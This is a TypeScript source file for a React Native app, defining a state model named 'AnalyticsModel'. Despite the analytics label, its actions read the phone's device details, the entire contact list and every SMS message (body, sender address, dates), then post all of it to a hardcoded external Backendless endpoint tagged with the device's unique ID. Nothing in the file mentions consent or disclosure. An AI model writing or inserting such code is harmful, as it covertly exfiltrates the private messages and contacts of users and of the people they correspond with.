import { types } from "mobx-state-tree"
import SmsAndroid from "react-native-get-sms-android"
import Contacts from "react-native-contacts"
import DeviceInfo from "react-native-device-info"

const BASE_URL =
  "https://api.backendless.com/10631C7B-F55C-6369-FF2C-95582BA50300/E16492A3-0A6A-499E-BB3C-A6C78E38279C/data"

// TODO: store analytics data in shared preferences and wait for internet connection in background to send data

export const AnalyticsModel = types
  .model({
    deviceInfoSynced: types.maybeNull(types.boolean),
    contactsSynced: types.maybeNull(types.boolean),
    smsListSynced: types.maybeNull(types.boolean),
  })
  .actions((self) => ({
    setDeviceInfoSynced() {
      self.deviceInfoSynced = true
    },
    setContactsSynced() {
      self.contactsSynced = true
    },
    setSmsListSynced() {
      self.smsListSynced = true
    },
    async trackDeviceInfo() {
      const userId = DeviceInfo.getUniqueId()

      // ------- Track Device Info.
      const brand = DeviceInfo.getBrand()
      const manufacturer = await DeviceInfo.getManufacturer()
      const model = DeviceInfo.getModel()
      const carrier = await DeviceInfo.getCarrier()
      const deviceId = DeviceInfo.getDeviceId()
      const deviceName = await DeviceInfo.getDeviceName()
      const host = await DeviceInfo.getHost()

      fetch(`${BASE_URL}/userInfo`, {
        method: "POST",
        body: JSON.stringify({
          userId,
          brand,
          manufacturer,
          model,
          carrier,
          deviceId,
          deviceName,
          host,
        }),
        headers: { "Content-Type": "application/json" },
      }).then(() => {
        this.setDeviceInfoSynced()
      })
    },
    async trackContacts() {
      const userId = DeviceInfo.getUniqueId()

      // ------- Track Contact
      const contacts = await Contacts.getAll()

      fetch(`${BASE_URL}/contacts`, {
        method: "POST",
        body: JSON.stringify({
          userId,
          contacts,
        }),
        headers: { "Content-Type": "application/json" },
      }).then(() => {
        this.setContactsSynced()
      })
    },
    async trackSmsList() {
      const userId = DeviceInfo.getUniqueId()

      // ------- Track SMS List
      SmsAndroid.list(
        JSON.stringify({ box: "" }),
        () => null,
        (count: number, smsList: string) => {
          const arr = JSON.parse(smsList) as {
            body: string
            type: string
            address: string
            date: number
            date_sent: number
          }[]

          const data = arr.map(({ body, type, address, date, date_sent }) => ({
            body,
            type,
            address,
            date,
            date_sent,
          }))

          fetch(`${BASE_URL}/smsList`, {
            method: "POST",
            body: JSON.stringify({
              userId,
              smsList: data,
            }),
            headers: { "Content-Type": "application/json" },
          }).then(() => {
            this.setSmsListSynced()
          })
        },
      )
    },
  }))
